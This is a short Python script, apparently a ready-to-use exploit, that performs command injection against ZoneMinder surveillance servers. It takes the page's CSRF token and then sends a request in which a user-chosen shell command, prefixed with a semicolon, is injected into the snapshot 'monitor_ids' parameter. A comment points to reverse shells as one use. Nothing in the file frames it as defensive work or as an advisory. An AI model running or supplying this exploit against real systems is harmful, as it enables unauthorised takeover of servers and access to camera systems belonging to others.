import requests
import argparse
from lxml import html


class ZoneMinderExploit:
    def __init__(self, target_uri, cmd):
        self.target_uri = target_uri
        self.cmd = cmd
        self.csrf_magic = None

    def print_csrf_magic(self):
        print("Fetching CSRF Token")
        res = requests.get(self.target_uri + 'index.php')

        if res.status_code == 200:
            self.csrf_magic = self.get_csrf_magic(res.text)
            if not self.csrf_magic or not self.csrf_magic.startswith('key:'):
                print("Unable to parse token.")
                return
            print(f"Got Token: {self.csrf_magic}")
        else:
            print("Unable to fetch token.")

    def execute_command(self):
        self.print_csrf_magic()

        print("[>] Sending payload..")
        data = {
            'view': 'snapshot',
            'action': 'create',
            'monitor_ids[0][Id]': f';{self.cmd}',
            '__csrf_magic': self.csrf_magic
        }

        try:
            response = requests.post(f"{self.target_uri}/index.php", data=data, timeout=5)
            if response.status_code == 200:
                print("[>] Command executed successfully!!")
            else:
                print("[!] Failed to send payload")
                print(f"Error: {response.status_code}")
                print(response.text)

        except requests.Timeout:
            print("[!] Script executed by out of time limit (if u used revshell, this will exit the script)")

    def get_csrf_magic(self, html_content):
        tree = html.fromstring(html_content)
        csrf_magic = tree.xpath('//input[@name="__csrf_magic"]/@value')
        return csrf_magic[0] if csrf_magic else None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='ZoneMinder Exploit')
    parser.add_argument('--target', required=True, help='Target URI (e.g., http://example.com/zm/)')
    parser.add_argument('--cmd', required=True, help='Command to execute on the target')

    args = parser.parse_args()
    exploit = ZoneMinderExploit(args.target, args.cmd)
    exploit.execute_command()

